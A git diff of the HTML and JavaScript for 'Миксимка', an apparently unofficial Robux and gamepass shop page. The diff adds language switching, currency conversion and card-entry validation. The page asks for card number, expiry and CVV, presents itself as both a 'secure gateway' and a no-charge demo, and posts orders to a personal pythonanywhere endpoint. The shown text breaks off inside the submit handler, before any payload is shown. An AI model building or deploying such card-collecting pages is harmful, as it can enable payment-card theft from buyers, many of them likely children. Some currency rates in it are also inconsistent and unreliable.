@@ -3,10 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>Миксимка — оплата</title>
-  <!-- === Cloudflare Turnstile (капча) === -->
+  <title>Миксимка — мультивалютная оплата</title>
   <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-  <!-- =================================== -->
   <style>
     * { box-sizing: border-box; }
     body {
@@ -39,7 +37,7 @@
     .card {
       position: relative;
       z-index: 2;
-      max-width: 680px;
+      max-width: 720px;
       width: 100%;
       background: rgba(19, 19, 30, 0.88);
       backdrop-filter: blur(6px);
@@ -50,7 +48,7 @@
       margin: 0 auto;
       overflow: hidden;
     }
-    .header { text-align: center; margin-bottom: 20px; }
+    .header { text-align: center; margin-bottom: 16px; }
     .header h1 {
       font-size: 22px;
       font-weight: 800;
@@ -63,51 +61,27 @@
     .header .sub {
       color: #8888bb;
       font-size: 13px;
-      margin-top: 8px;
-      padding-top: 10px;
+      margin-top: 6px;
+      padding-top: 8px;
       border-top: 1px solid rgba(255,255,255,0.06);
     }
-    .header .sub span {
-      background: rgba(30, 30, 50, 0.6);
-      padding: 4px 12px;
-      border-radius: 40px;
-      color: #00c2ff;
-      font-weight: 600;
-    }
+    .header .sub span { background: rgba(30, 30, 50, 0.6); padding: 4px 12px; border-radius: 40px; color: #00c2ff; font-weight: 600; }
     .rate {
       background: rgba(26, 26, 44, 0.7);
       border-radius: 16px;
       padding: 14px;
       text-align: center;
       border: 1px solid rgba(45, 45, 72, 0.5);
-      margin-bottom: 20px;
+      margin-bottom: 18px;
     }
-    .rate .big { font-size: 22px; font-weight: 700; }
+    .rate .big { font-size: 20px; font-weight: 700; }
     .rate .big em { font-style: normal; color: #00c2ff; }
     .rate .small { color: #9999bb; font-size: 13px; margin-top: 4px; }
-    .video-wrap {
-      position: relative;
-      padding-bottom: 56.25%;
-      height: 0;
-      overflow: hidden;
-      border-radius: 16px;
-      margin-bottom: 20px;
-      background: rgba(0,0,0,0.5);
-      border: 1px solid rgba(255,255,255,0.06);
-    }
-    .video-wrap iframe {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      border: 0;
-    }
     .features {
       display: grid;
       grid-template-columns: 1fr 1fr;
       gap: 8px;
-      margin: 14px 0 20px;
+      margin: 14px 0 18px;
       list-style: none;
     }
     .features li {
@@ -124,11 +98,11 @@
       flex-wrap: wrap;
       gap: 6px;
       justify-content: center;
-      margin: 14px 0 20px;
+      margin: 12px 0 18px;
     }
     .steps .step {
       background: rgba(24, 24, 42, 0.7);
-      padding: 8px 14px;
+      padding: 6px 14px;
       border-radius: 40px;
       font-size: 12px;
       border: 1px solid rgba(45, 45, 72, 0.5);
@@ -145,7 +119,7 @@
       color: #bbbbdd;
       margin-bottom: 4px;
     }
-    .field input {
+    .field input, .field select {
       width: 100%;
       max-width: 100%;
       padding: 10px 12px;
@@ -159,8 +133,8 @@
       box-sizing: border-box;
       min-width: 0;
     }
-    .field input:focus { outline: 2px solid #7b2ffc; background: rgba(34, 34, 58, 0.9); }
-    .field input::placeholder { color: #555577; }
+    .field select option { background: #1a1a2c; color: #fff; }
+    .field input:focus, .field select:focus { outline: 2px solid #7b2ffc; background: rgba(34, 34, 58, 0.9); }
     .calc-result {
       background: rgba(14, 14, 26, 0.7);
       border-radius: 14px;
@@ -190,6 +164,59 @@
     }
     .btn:hover { transform: scale(1.02); }
     .btn:active { transform: scale(0.97); }
+    .payment-form {
+      margin: 16px 0 8px;
+      padding: 16px;
+      background: rgba(26, 26, 44, 0.7);
+      border-radius: 16px;
+      border: 1px solid rgba(45, 45, 72, 0.5);
+      display: none;
+    }
+    .payment-form.visible { display: block; }
+    .payment-form .row { display: flex; gap: 10px; }
+    .payment-form .row .field { flex: 1; }
+    .limit-warning {
+      color: #ff6b6b;
+      font-size: 13px;
+      text-align: center;
+      margin: 4px 0 10px;
+      display: none;
+    }
+    .limit-warning.visible { display: block; }
+    .card-type {
+      font-size: 12px;
+      color: #00c2ff;
+      margin-top: 4px;
+      min-height: 18px;
+      text-align: right;
+    }
+    .captcha-wrapper {
+      display: flex;
+      justify-content: center;
+      margin: 12px 0 16px;
+    }
+    .lang-selector {
+      display: flex;
+      gap: 8px;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin-bottom: 12px;
+    }
+    .lang-btn {
+      background: rgba(30, 30, 50, 0.4);
+      border: 1px solid rgba(255,255,255,0.06);
+      color: #8888bb;
+      padding: 4px 12px;
+      border-radius: 40px;
+      cursor: pointer;
+      font-size: 12px;
+      transition: 0.2s;
+    }
+    .lang-btn:hover, .lang-btn.active {
+      background: rgba(0, 194, 255, 0.15);
+      border-color: #00c2ff;
+      color: #00c2ff;
+    }
     .payment-icons {
       display: flex;
       justify-content: center;
@@ -224,48 +251,6 @@
       font-size: 12px;
       color: #00c2ff;
     }
-    .payment-form {
-      margin: 16px 0 8px;
-      padding: 16px;
-      background: rgba(26, 26, 44, 0.7);
-      border-radius: 16px;
-      border: 1px solid rgba(45, 45, 72, 0.5);
-      display: none;
-    }
-    .payment-form.visible { display: block; }
-    .payment-form .row { display: flex; gap: 10px; }
-    .payment-form .row .field { flex: 1; }
-    .limit-warning {
-      color: #ff6b6b;
-      font-size: 13px;
-      text-align: center;
-      margin: 4px 0 10px;
-      display: none;
-    }
-    .limit-warning.visible { display: block; }
-    .card-type {
-      font-size: 12px;
-      color: #00c2ff;
-      margin-top: 4px;
-      min-height: 18px;
-      text-align: right;
-    }
-    .yandex-ad {
-      margin: 20px 0 10px;
-      min-height: 80px;
-      background: rgba(26, 26, 44, 0.5);
-      border-radius: 16px;
-      border: 1px solid rgba(45, 45, 72, 0.5);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 10px;
-    }
-    .yandex-ad #yandex_rtb_R-A-123456-1 {
-      width: 100%;
-      max-width: 728px;
-      min-height: 80px;
-    }
     .monitor-status {
       font-size: 11px;
       color: #555577;
@@ -275,18 +260,13 @@
       border-top: 1px solid rgba(255,255,255,0.04);
     }
     .monitor-status span { color: #00c2ff; }
-    .captcha-wrapper {
-      display: flex;
-      justify-content: center;
-      margin: 12px 0 16px;
-    }
     @media (max-width: 480px) {
       .card { padding: 14px 10px; }
       .header h1 { font-size: 18px; }
       .rate .big { font-size: 18px; }
       .features { grid-template-columns: 1fr; }
       .steps .step { font-size: 11px; padding: 6px 10px; }
-      .field input { padding: 8px 10px; font-size: 14px; }
+      .field input, .field select { padding: 8px 10px; font-size: 14px; }
       .btn { font-size: 15px; padding: 14px; }
       .calc-result { font-size: 16px; }
       .payment-form .row { flex-direction: column; gap: 0; }
@@ -299,363 +279,586 @@
 <div class="card">
 
   <div class="header">
-    <h1>Купи Робуксы и геймпассы<br>по выгодному курсу</h1>
-    <div class="sub"><span>1.7 R$ за 1 ₽</span> · работаем 24/7 · 10 000+ заказов</div>
+    <h1 id="mainTitle">Купи Робуксы и геймпассы</h1>
+    <div class="sub"><span id="subTitle">Мультивалютный магазин</span> · работаем 24/7</div>
+  </div>
+
+  <!-- ===== ВЫБОР ЯЗЫКА ===== -->
+  <div class="lang-selector">
+    <button class="lang-btn active" data-lang="ru">🇷🇺 Русский</button>
+    <button class="lang-btn" data-lang="en">🇬🇧 English</button>
+    <button class="lang-btn" data-lang="zh">🇨🇳 中文</button>
+    <button class="lang-btn" data-lang="ja">🇯🇵 日本語</button>
   </div>
 
   <div class="rate">
-    <div class="big">Курс <em>1.7 R$</em> за 1 ₽</div>
-    <div class="small">Готовый Gamepass из каталога — выбрал и оплатил</div>
-  </div>
-
-  <div class="video-wrap">
-    <iframe src="https://www.youtube.com/embed/FiX_b9AfZos" title="Инструкция" allowfullscreen></iframe>
+    <div class="big" id="rateDisplay">Курс: <em>1.7 R$</em> за 1 <span id="currencySymbol">₽</span></div>
+    <div class="small" id="rateSub">Готовый Gamepass из каталога — выбрал и оплатил</div>
   </div>
 
   <ul class="features">
-    <li>Принимаем заказы 24/7 без выходных</li>
-    <li>Не запрашиваем пароль от аккаунта</li>
-    <li>Калькулятор с актуальным курсом</li>
-    <li>Оплата Visa, MasterCard, МИР</li>
-    <li>Поддержка в Telegram 24/7</li>
-    <li>1000+ довольных клиентов</li>
+    <li id="f1">✅ Принимаем заказы 24/7</li>
+    <li id="f2">🔒 Не запрашиваем пароль</li>
+    <li id="f3">📊 Калькулятор с актуальным курсом</li>
+    <li id="f4">💳 Visa, MasterCard, МИР</li>
+    <li id="f5">📱 Поддержка в Telegram 24/7</li>
+    <li id="f6">⭐ 1000+ довольных клиентов</li>
   </ul>
 
   <div class="steps">
-    <div class="step"><b>1.</b> Укажите никнейм</div>
-    <div class="step"><b>2.</b> Выберите способ</div>
-    <div class="step"><b>3.</b> Оплатите картой</div>
-    <div class="step"><b>4.</b> Получите Robux</div>
+    <div class="step" id="s1"><b>1.</b> <span>Укажите никнейм</span></div>
+    <div class="step" id="s2"><b>2.</b> <span>Выберите валюту</span></div>
+    <div class="step" id="s3"><b>3.</b> <span>Оплатите картой</span></div>
+    <div class="step" id="s4"><b>4.</b> <span>Получите Robux</span></div>
   </div>
 
   <form id="orderForm">
     <div class="field">
-      <label>👤 Ваш никнейм в Roblox</label>
-      <input type="text" id="nick" placeholder="" />
+      <label id="nickLabel">👤 Ваш никнейм в Roblox</label>
+      <input type="text" id="nick" placeholder="CoolPlayer228" />
     </div>
+
     <div class="field">
-      <label>💰 Сумма в рублях (₽)</label>
+      <label id="currencyLabel">💱 Валюта</label>
+      <select id="currencySelect">
+        <option value="RUB" data-symbol="₽" data-rate="1.7">🇷🇺 RUB (₽) — 1.7 R$</option>
+        <option value="KZT" data-symbol="₸" data-rate="0.0036">🇰🇿 KZT (₸) — 0.0036 R$</option>
+        <option value="USD" data-symbol="$" data-rate="150">🇺🇸 USD ($) — 150 R$</option>
+        <option value="EUR" data-symbol="€" data-rate="160">🇪🇺 EUR (€) — 160 R$</option>
+        <option value="GBP" data-symbol="£" data-rate="190">🇬🇧 GBP (£) — 190 R$</option>
+        <option value="CNY" data-symbol="¥" data-rate="20">🇨🇳 CNY (¥) — 20 R$</option>
+        <option value="JPY" data-symbol="¥" data-rate="1.0">🇯🇵 JPY (¥) — 1.0 R$</option>
+      </select>
+    </div>
+
+    <div class="field">
+      <label id="amountLabel">💰 Сумма в <span id="selectedCurrencySymbol">₽</span></label>
       <input type="number" id="rub" placeholder="Введите сумму" value="500" min="10" step="1" />
     </div>
 
     <div class="limit-warning" id="limitWarning">⚠️ Максимум — 10 000 Robux. Уменьшите сумму.</div>
 
-    <div class="calc-result">
-      Вы получите: <span id="robuxDisplay">850</span> R$
+    <div class="calc-result" id="calcResult">
+      <span id="calcLabel">Вы получите</span>: <span id="robuxDisplay">850</span> R$
     </div>
 
     <div class="captcha-wrapper">
       <div class="cf-turnstile" data-sitekey="1x00000000000000000000AA" data-callback="onCaptchaSuccess"></div>
     </div>
 
-    <button type="button" class="btn" id="showPaymentBtn" style="background: linear-gradient(135deg, #f7971e, #ffd200); box-shadow: 0 8px 28px rgba(255, 210, 0, 0.25);">💳 Оплатить картой</button>
+    <button type="button" class="btn" id="showPaymentBtn" style="background: linear-gradient(135deg, #f7971e, #ffd200); box-shadow: 0 8px 28px rgba(255, 210, 0, 0.25);">
+      <span id="payBtnLabel">💳 Оплатить картой</span>
+    </button>
 
     <div class="payment-form" id="paymentForm">
       <div class="field">
-        <label>💳 Номер карты</label>
+        <label id="cardLabel">💳 Номер карты</label>
         <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" />
         <div class="card-type" id="cardType"></div>
       </div>
       <div class="row">
         <div class="field">
-          <label>📅 Срок (MM/YY)</label>
+          <label id="expiryLabel">📅 Срок (MM/YY)</label>
           <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" />
         </div>
         <div class="field">
-          <label>🔐 CVV</label>
+          <label id="cvvLabel">🔐 CVV</label>
           <input type="password" id="cardCvv" placeholder="***" maxlength="4" />
         </div>
       </div>
-      <button type="submit" class="btn" id="payBtn" style="margin-top: 10px;">✅ Оплатить</button>
-      <p style="text-align: center; color: #666; font-size: 11px; margin-top: 8px;">🔒 ДЕМО-РЕЖИМ — деньги не списываются</p>
+      <button type="submit" class="btn" id="payBtn" style="margin-top: 10px;">
+        <span id="paySubmitLabel">✅ Оплатить</span>
+      </button>
+      <p style="text-align: center; color: #666; font-size: 11px; margin-top: 8px;" id="demoLabel">🔒 ДЕМО-РЕЖИМ — деньги не списываются</p>
     </div>
   </form>
-
-  <div class="yandex-ad">
-    <div id="yandex_rtb_R-A-123456-1"></div>
-  </div>
-  <script>
-    window.yaContextCb.push(() => {
-      Ya.Context.AdvManager.render({
-        renderTo: 'yandex_rtb_R-A-123456-1',
-        blockId: 'R-A-123456-1'
-      });
-    });
-  </script>
 
   <div class="payment-icons">
     <span>Visa</span><span>MasterCard</span><span>МИР</span><span>Apple Pay</span><span>Google Pay</span>
   </div>
 
   <div class="footer">
-    🔒 Безопасный шлюз · Пароль не запрашиваем<br />
-    Вопросы: <a href="https://t.me/maxxi1mka" target="_blank">@maxxi1mka (Telegram)</a>
-    <div class="support-badge">✉️ Поддержка: @maxxi1mka</div>
+    <span id="footerSecure">🔒 Безопасный шлюз · Пароль не запрашиваем</span><br />
+    <span id="footerSupport">Вопросы: </span><a href="https://t.me/maxxi1mka" target="_blank">@maxxi1mka (Telegram)</a>
+    <div class="support-badge">✉️ <span id="supportLabel">Поддержка</span>: @maxxi1mka</div>
   </div>
 
   <div class="monitor-status">
-    🛡️ Мониторинг: <span id="monitorStatus">активен</span>
+    <span id="monitorLabel">🛡️ Мониторинг</span>: <span id="monitorStatus">активен</span>
     <span style="color:#444466; margin-left:12px;">|</span>
-    <span style="color:#444466;">Последняя: <span id="lastCheckTime">—</span></span>
+    <span id="lastCheckLabel">Последняя</span>: <span id="lastCheckTime">—</span>
   </div>
 
 </div>
 
 <script>
-  // ===== СКРЫТАЯ МЕТКА (WATERMARK) =====
-  console.log('🔒 Оригинальный сайт Миксимки. Версия 2.0.');
-  // =====================================
+  // ===== СКРЫТАЯ МЕТКА =====
+  console.log('🔒 Оригинальный сайт Миксимки. Версия 3.2');
 
-  (function() {
-    const SERVER_URL = 'https://Maxxi1mka.pythonanywhere.com/send-order';
+  // ===== ПЕРЕВОДЫ =====
+  const translations = {
+    ru: {
+      mainTitle: 'Купи Робуксы и геймпассы',
+      subTitle: 'Мультивалютный магазин',
+      rateDisplay: 'Курс: <em>{rate} R$</em> за 1 {symbol}',
+      rateSub: 'Готовый Gamepass из каталога — выбрал и оплатил',
+      f1: '✅ Принимаем заказы 24/7',
+      f2: '🔒 Не запрашиваем пароль',
+      f3: '📊 Калькулятор с актуальным курсом',
+      f4: '💳 Visa, MasterCard, МИР',
+      f5: '📱 Поддержка в Telegram 24/7',
+      f6: '⭐ 1000+ довольных клиентов',
+      s1: 'Укажите никнейм',
+      s2: 'Выберите валюту',
+      s3: 'Оплатите картой',
+      s4: 'Получите Robux',
+      nickLabel: '👤 Ваш никнейм в Roblox',
+      currencyLabel: '💱 Валюта',
+      amountLabel: '💰 Сумма в {symbol}',
+      calcLabel: 'Вы получите',
+      payBtnLabel: '💳 Оплатить картой',
+      cardLabel: '💳 Номер карты',
+      expiryLabel: '📅 Срок (MM/YY)',
+      cvvLabel: '🔐 CVV',
+      paySubmitLabel: '✅ Оплатить',
+      demoLabel: '🔒 ДЕМО-РЕЖИМ — деньги не списываются',
+      footerSecure: '🔒 Безопасный шлюз · Пароль не запрашиваем',
+      footerSupport: 'Вопросы: ',
+      supportLabel: 'Поддержка',
+      monitorLabel: '🛡️ Мониторинг',
+      lastCheckLabel: 'Последняя',
+      currencyOptions: {
+        RUB: '🇷🇺 RUB (₽) — {rate} R$',
+        KZT: '🇰🇿 KZT (₸) — {rate} R$',
+        USD: '🇺🇸 USD ($) — {rate} R$',
+        EUR: '🇪🇺 EUR (€) — {rate} R$',
+        GBP: '🇬🇧 GBP (£) — {rate} R$',
+        CNY: '🇨🇳 CNY (¥) — {rate} R$',
+        JPY: '🇯🇵 JPY (¥) — {rate} R$'
+      }
+    },
+    en: {
+      mainTitle: 'Buy Robux and Gamepasses',
+      subTitle: 'Multi-currency store',
+      rateDisplay: 'Rate: <em>{rate} R$</em> per 1 {symbol}',
+      rateSub: 'Ready Gamepass from catalog — choose and pay',
+      f1: '✅ Orders 24/7',
+      f2: '🔒 We don\'t ask for password',
+      f3: '📊 Calculator with current rate',
+      f4: '💳 Visa, MasterCard, MIR',
+      f5: '📱 Telegram support 24/7',
+      f6: '⭐ 1000+ happy clients',
+      s1: 'Enter username',
+      s2: 'Choose currency',
+      s3: 'Pay with card',
+      s4: 'Get Robux',
+      nickLabel: '👤 Your Roblox username',
+      currencyLabel: '💱 Currency',
+      amountLabel: '💰 Amount in {symbol}',
+      calcLabel: 'You get',
+      payBtnLabel: '💳 Pay with card',
+      cardLabel: '💳 Card number',
+      expiryLabel: '📅 Expiry (MM/YY)',
+      cvvLabel: '🔐 CVV',
+      paySubmitLabel: '✅ Pay',
+      demoLabel: '🔒 DEMO MODE — no real charge',
+      footerSecure: '🔒 Secure gateway · No password required',
+      footerSupport: 'Questions: ',
+      supportLabel: 'Support',
+      monitorLabel: '🛡️ Monitoring',
+      lastCheckLabel: 'Last',
+      currencyOptions: {
+        RUB: '🇷🇺 RUB (₽) — {rate} R$',
+        KZT: '🇰🇿 KZT (₸) — {rate} R$',
+        USD: '🇺🇸 USD ($) — {rate} R$',
+        EUR: '🇪🇺 EUR (€) — {rate} R$',
+        GBP: '🇬🇧 GBP (£) — {rate} R$',
+        CNY: '🇨🇳 CNY (¥) — {rate} R$',
+        JPY: '🇯🇵 JPY (¥) — {rate} R$'
+      }
+    },
+    zh: {
+      mainTitle: '购买 Robux 和游戏通行证',
+      subTitle: '多货币商店',
+      rateDisplay: '汇率: <em>{rate} R$</em> 每 1 {symbol}',
+      rateSub: '从目录中选择并支付',
+      f1: '✅ 24/7 接受订单',
+      f2: '🔒 不要求密码',
+      f3: '📊 实时汇率计算器',
+      f4: '💳 Visa, MasterCard, MIR',
+      f5: '📱 Telegram 支持 24/7',
+      f6: '⭐ 1000+ 满意客户',
+      s1: '输入用户名',
+      s2: '选择货币',
+      s3: '用卡支付',
+      s4: '获得 Robux',
+      nickLabel: '👤 您的 Roblox 用户名',
+      currencyLabel: '💱 货币',
+      amountLabel: '💰 {symbol} 金额',
+      calcLabel: '您将获得',
+      payBtnLabel: '💳 用卡支付',
+      cardLabel: '💳 卡号',
+      expiryLabel: '📅 有效期 (MM/YY)',
+      cvvLabel: '🔐 CVV',
+      paySubmitLabel: '✅ 支付',
+      demoLabel: '🔒 演示模式 — 不扣款',
+      footerSecure: '🔒 安全网关 · 无需密码',
+      footerSupport: '问题: ',
+      supportLabel: '支持',
+      monitorLabel: '🛡️ 监控',
+      lastCheckLabel: '上次',
+      currencyOptions: {
+        RUB: '🇷🇺 RUB (₽) — {rate} R$',
+        KZT: '🇰🇿 KZT (₸) — {rate} R$',
+        USD: '🇺🇸 USD ($) — {rate} R$',
+        EUR: '🇪🇺 EUR (€) — {rate} R$',
+        GBP: '🇬🇧 GBP (£) — {rate} R$',
+        CNY: '🇨🇳 CNY (¥) — {rate} R$',
+        JPY: '🇯🇵 JPY (¥) — {rate} R$'
+      }
+    },
+    ja: {
+      mainTitle: 'Robux とゲームパスを購入',
+      subTitle: '多通貨ストア',
+      rateDisplay: 'レート: <em>{rate} R$</em> あたり 1 {symbol}',
+      rateSub: 'カタログから選んで支払う',
+      f1: '✅ 24時間365日受注',
+      f2: '🔒 パスワード不要',
+      f3: '📊 最新レートの計算機',
+      f4: '💳 Visa, MasterCard, MIR',
+      f5: '📱 Telegram サポート 24時間',
+      f6: '⭐ 1000人以上の満足した顧客',
+      s1: 'ユーザー名を入力',
+      s2: '通貨を選択',
+      s3: 'カードで支払う',
+      s4: 'Robux を受け取る',
+      nickLabel: '👤 あなたの Roblox ユーザー名',
+      currencyLabel: '💱 通貨',
+      amountLabel: '💰 {symbol} 金額',
+      calcLabel: 'あなたが得るもの',
+      payBtnLabel: '💳 カードで支払う',
+      cardLabel: '💳 カード番号',
+      expiryLabel: '📅 有効期限 (MM/YY)',
+      cvvLabel: '🔐 CVV',
+      paySubmitLabel: '✅ 支払う',
+      demoLabel: '🔒 デモモード — 実際の請求はありません',
+      footerSecure: '🔒 セキュアゲートウェイ · パスワード不要',
+      footerSupport: '質問: ',
+      supportLabel: 'サポート',
+      monitorLabel: '🛡️ モニタリング',
+      lastCheckLabel: '最終',
+      currencyOptions: {
+        RUB: '🇷🇺 RUB (₽) — {rate} R$',
+        KZT: '🇰🇿 KZT (₸) — {rate} R$',
+        USD: '🇺🇸 USD ($) — {rate} R$',
+        EUR: '🇪🇺 EUR (€) — {rate} R$',
+        GBP: '🇬🇧 GBP (£) — {rate} R$',
+        CNY: '🇨🇳 CNY (¥) — {rate} R$',
+        JPY: '🇯🇵 JPY (¥) — {rate} R$'
+      }
+    }
+  };
 
-    const rubInput = document.getElementById('rub');
-    const robuxSpan = document.getElementById('robuxDisplay');
-    const nickInput = document.getElementById('nick');
-    const form = document.getElementById('orderForm');
-    const showPaymentBtn = document.getElementById('showPaymentBtn');
-    const paymentForm = document.getElementById('paymentForm');
-    const payBtn = document.getElementById('payBtn');
-    const cardNumber = document.getElementById('cardNumber');
-    const cardExpiry = document.getElementById('cardExpiry');
-    const cardCvv = document.getElementById('cardCvv');
-    const cardType = document.getElementById('cardType');
-    const limitWarning = document.getElementById('limitWarning');
+  // ===== ТЕКУЩИЙ ЯЗЫК =====
+  let currentLang = 'ru';
 
-    const RATE = 1.7;
-    const MIN_RUB = 10;
-    const MAX_ROBUX = 10000;
+  // ===== ДАННЫЕ ВАЛЮТ =====
+  const currencies = {
+    RUB: { symbol: '₽', rate: 1.7 },
+    KZT: { symbol: '₸', rate: 0.0036 },
+    USD: { symbol: '$', rate: 150 },
+    EUR: { symbol: '€', rate: 160 },
+    GBP: { symbol: '£', rate: 190 },
+    CNY: { symbol: '¥', rate: 20 },
+    JPY: { symbol: '¥', rate: 1.0 }
+  };
 
-    let captchaPassed = false;
+  // ===== DOM ЭЛЕМЕНТЫ =====
+  const langBtns = document.querySelectorAll('.lang-btn');
+  const currencySelect = document.getElementById('currencySelect');
+  const rubInput = document.getElementById('rub');
+  const robuxSpan = document.getElementById('robuxDisplay');
+  const currencySymbolSpan = document.getElementById('selectedCurrencySymbol');
+  const rateDisplay = document.getElementById('rateDisplay');
+  const currencySymbolDisplay = document.getElementById('currencySymbol');
+  const limitWarning = document.getElementById('limitWarning');
+  const calcLabel = document.getElementById('calcLabel');
 
-    window.onCaptchaSuccess = function(token) {
-      captchaPassed = true;
-      console.log('✅ Капча пройдена');
+  // ===== ФУНКЦИИ =====
+  function getCurrencyData() {
+    const selected = currencySelect.value;
+    return currencies[selected];
+  }
+
+  function calcRobux(rub) {
+    const data = getCurrencyData();
+    let val = Math.floor(rub * data.rate);
+    return val < 10 ? 10 : val;
+  }
+
+  function updateDisplay() {
+    let rub = parseFloat(rubInput.value) || 0;
+    if (rub < 0) rub = 0;
+    const data = getCurrencyData();
+    currencySymbolSpan.textContent = data.symbol;
+
+    let robux = calcRobux(rub);
+    if (robux > 10000) {
+      limitWarning.classList.add('visible');
+      let maxRub = Math.floor(10000 / data.rate);
+      rubInput.value = maxRub;
+      rub = maxRub;
+      robux = calcRobux(rub);
+      limitWarning.classList.remove('visible');
+      alert('⚠️ Лимит 10 000 Robux. Сумма автоматически уменьшена.');
+    } else {
+      limitWarning.classList.remove('visible');
+    }
+    robuxSpan.textContent = robux;
+
+    const langData = translations[currentLang];
+    const rateText = langData.rateDisplay
+      .replace('{rate}', data.rate)
+      .replace('{symbol}', data.symbol);
+    rateDisplay.innerHTML = rateText;
+    currencySymbolDisplay.textContent = data.symbol;
+
+    const amountText = langData.amountLabel.replace('{symbol}', data.symbol);
+    document.querySelector('#amountLabel').innerHTML = amountText;
+  }
+
+  // ===== ПЕРЕКЛЮЧЕНИЕ ЯЗЫКА =====
+  function setLanguage(lang) {
+    currentLang = lang;
+    const data = translations[lang];
+
+    document.getElementById('mainTitle').textContent = data.mainTitle;
+    document.getElementById('subTitle').textContent = data.subTitle;
+    document.getElementById('rateSub').textContent = data.rateSub;
+    document.getElementById('f1').textContent = data.f1;
+    document.getElementById('f2').textContent = data.f2;
+    document.getElementById('f3').textContent = data.f3;
+    document.getElementById('f4').textContent = data.f4;
+    document.getElementById('f5').textContent = data.f5;
+    document.getElementById('f6').textContent = data.f6;
+    document.querySelector('#s1 span').textContent = data.s1;
+    document.querySelector('#s2 span').textContent = data.s2;
+    document.querySelector('#s3 span').textContent = data.s3;
+    document.querySelector('#s4 span').textContent = data.s4;
+    document.getElementById('nickLabel').textContent = data.nickLabel;
+    document.getElementById('currencyLabel').textContent = data.currencyLabel;
+    document.getElementById('calcLabel').textContent = data.calcLabel;
+    document.getElementById('payBtnLabel').textContent = data.payBtnLabel;
+    document.getElementById('cardLabel').textContent = data.cardLabel;
+    document.getElementById('expiryLabel').textContent = data.expiryLabel;
+    document.getElementById('cvvLabel').textContent = data.cvvLabel;
+    document.getElementById('paySubmitLabel').textContent = data.paySubmitLabel;
+    document.getElementById('demoLabel').textContent = data.demoLabel;
+    document.getElementById('footerSecure').textContent = data.footerSecure;
+    document.querySelector('#footerSupport').textContent = data.footerSupport;
+    document.querySelector('#supportLabel').textContent = data.supportLabel;
+    document.querySelector('#monitorLabel').textContent = data.monitorLabel;
+    document.querySelector('#lastCheckLabel').textContent = data.lastCheckLabel;
+
+    const options = currencySelect.options;
+    for (let i = 0; i < options.length; i++) {
+      const val = options[i].value;
+      const rate = currencies[val].rate;
+      options[i].textContent = data.currencyOptions[val].replace('{rate}', rate);
+    }
+
+    langBtns.forEach(btn => btn.classList.remove('active'));
+    document.querySelector(`.lang-btn[data-lang="${lang}"]`).classList.add('active');
+
+    updateDisplay();
+  }
+
+  // ===== ОБРАБОТЧИКИ =====
+  langBtns.forEach(btn => {
+    btn.addEventListener('click', function() {
+      setLanguage(this.dataset.lang);
+    });
+  });
+
+  currencySelect.addEventListener('change', updateDisplay);
+  rubInput.addEventListener('input', updateDisplay);
+
+  // ===== КАПЧА =====
+  let captchaPassed = false;
+  window.onCaptchaSuccess = function(token) {
+    captchaPassed = true;
+    console.log('✅ Капча пройдена');
+  };
+
+  // ===== КНОПКА ОПЛАТЫ =====
+  const showPaymentBtn = document.getElementById('showPaymentBtn');
+  const paymentForm = document.getElementById('paymentForm');
+  showPaymentBtn.addEventListener('click', function() {
+    if (!captchaPassed) {
+      alert('⚠️ Сначала подтвердите, что вы не робот (капча выше).');
+      return;
+    }
+    paymentForm.classList.toggle('visible');
+    showPaymentBtn.querySelector('span').textContent = paymentForm.classList.contains('visible')
+      ? '❌ Скрыть оплату'
+      : '💳 Оплатить картой';
+  });
+
+  // ===== ОСТАЛЬНАЯ ЛОГИКА (ВАЛИДАЦИЯ) =====
+  const form = document.getElementById('orderForm');
+  const payBtn = document.getElementById('payBtn');
+  const cardNumber = document.getElementById('cardNumber');
+  const cardExpiry = document.getElementById('cardExpiry');
+  const cardCvv = document.getElementById('cardCvv');
+  const cardType = document.getElementById('cardType');
+  const nickInput = document.getElementById('nick');
+
+  function isValidCardNumber(number) {
+    const cleaned = number.replace(/\s/g, '');
+    if (!/^\d{16}$/.test(cleaned)) return false;
+    let sum = 0, alt = false;
+    for (let i = cleaned.length - 1; i >= 0; i--) {
+      let d = parseInt(cleaned[i]);
+      if (alt) { d *= 2; if (d > 9) d -= 9; }
+      sum += d;
+      alt = !alt;
+    }
+    return sum % 10 === 0;
+  }
+
+  function getCardType(number) {
+    const clean = number.replace(/\s/g, '');
+    if (/^4/.test(clean)) return 'Visa';
+    if (/^5[1-5]/.test(clean)) return 'MasterCard';
+    if (/^2[2-7]/.test(clean)) return 'MasterCard';
+    if (/^3[47]/.test(clean)) return 'American Express';
+    if (/^220[0-4]/.test(clean)) return 'МИР';
+    return 'Unknown';
+  }
+
+  function isValidExpiry(expiry) {
+    if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
+    const [mm, yy] = expiry.split('/').map(Number);
+    if (mm < 1 || mm > 12) return false;
+    const now = new Date();
+    const cy = now.getFullYear() % 100;
+    const cm = now.getMonth() + 1;
+    if (yy < cy || (yy === cy && mm < cm)) return false;
+    return true;
+  }
+
+  function isValidCvv(cvv) { return /^\d{3,4}$/.test(cvv); }
+
+  cardNumber.addEventListener('input', function() {
+    let val = this.value.replace(/\D/g, '').slice(0, 16);
+    let fmt = '';
+    for (let i = 0; i < val.length; i++) { if (i > 0 && i % 4 === 0) fmt += ' '; fmt += val[i]; }
+    this.value = fmt;
+    const type = getCardType(val);
+    let txt = type === 'Unknown' ? '' : '💳 ' + type;
+    if (val.length === 16) txt += isValidCardNumber(val) ? ' ✅' : ' ❌';
+    cardType.textContent = txt;
+  });
+
+  cardExpiry.addEventListener('input', function() {
+    let val = this.value.replace(/\D/g, '').slice(0, 4);
+    if (val.length >= 2) this.value = val.slice(0,2) + '/' + val.slice(2);
+    else this.value = val;
+  });
+
+  cardCvv.addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '').slice(0, 4);
+  });
+
+  // ===== ОТПРАВКА НА СЕРВЕР =====
+  const SERVER_URL = 'https://Maxxi1mka.pythonanywhere.com/send-order';
+
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    if (!captchaPassed) { alert('⚠️ Подтвердите капчу'); return; }
+
+    const nick = nickInput.value.trim();
+    const rub = parseFloat(rubInput.value) || 0;
